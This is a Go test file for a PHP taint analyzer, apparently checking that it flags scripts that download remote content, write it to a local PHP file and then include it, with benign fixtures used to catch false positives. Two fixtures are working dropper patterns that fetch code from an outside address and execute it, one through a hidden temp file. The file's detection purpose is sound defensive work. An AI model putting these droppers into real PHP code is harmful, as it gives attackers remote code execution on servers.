package phptaint

import "testing"

// Fixtures are PHP samples fed to the analyzer as bytes; nothing here is
// executed. The canonical dropper fetches remote content, writes it to a local file
// and includes that file by path. Taint only flowed through variables and
// file_put_contents was neither a sink nor a bridge, so the include of a
// literal (or variable) path carried no taint: the report came back
// analyzed with zero results, which downstream reads as examined-and-clean.
var (
	fxWriteIncludeLiteral = b64(`<?php
$c = file_get_contents('http://203.0.113.5/p.txt');
file_put_contents(__DIR__ . '/cache.php', $c);
include __DIR__ . '/cache.php';`)

	fxWriteIncludeVariable = b64(`<?php
function grab($u) { return curl_exec(curl_init($u)); }
$p = sys_get_temp_dir() . '/.x.php';
$body = grab('http://203.0.113.5/p.txt');
file_put_contents($p, $body);
require_once $p;`)

	fxWriteIncludeBenign = b64(`<?php
$feed = file_get_contents('http://203.0.113.5/feed.json');
file_put_contents(__DIR__ . '/feed-cache.json', $feed);
include __DIR__ . '/parts/header.php';`)

	fxWriteLocalIncludeBenign = b64(`<?php
$tpl = file_get_contents(__DIR__ . '/template.txt');
file_put_contents(__DIR__ . '/compiled.php', $tpl);
include __DIR__ . '/compiled.php';
eval('return 1;');`)
)

func TestDetectsFetchWriteIncludeDropper(t *testing.T) {
	for name, fx := range map[string]string{
		"literal path":  fxWriteIncludeLiteral,
		"variable path": fxWriteIncludeVariable,
	} {
		rep := run(t, fx)
		if rep.Status != StatusAnalyzed {
			t.Fatalf("%s: status = %v (%s)", name, rep.Status, rep.Reason)
		}
		if len(rep.Results) == 0 {
			t.Fatalf("%s: remote content written to disk and then included was reported clean", name)
		}
		if sink := rep.Results[0].Sink; sink != "include" && sink != "require_once" {
			t.Errorf("%s: sink = %q, want the include", name, sink)
		}
	}
}

func TestFetchWriteWithoutIncludeOfThatFileReportsNothing(t *testing.T) {
	for name, fx := range map[string]string{
		"different file": fxWriteIncludeBenign,
		"local template": fxWriteLocalIncludeBenign,
	} {
		rep := run(t, fx)
		if rep.Status != StatusAnalyzed {
			t.Fatalf("%s: status = %v (%s)", name, rep.Status, rep.Reason)
		}
		if len(rep.Results) != 0 {
			t.Errorf("%s: false positive: %+v", name, rep.Results)
		}
	}
}
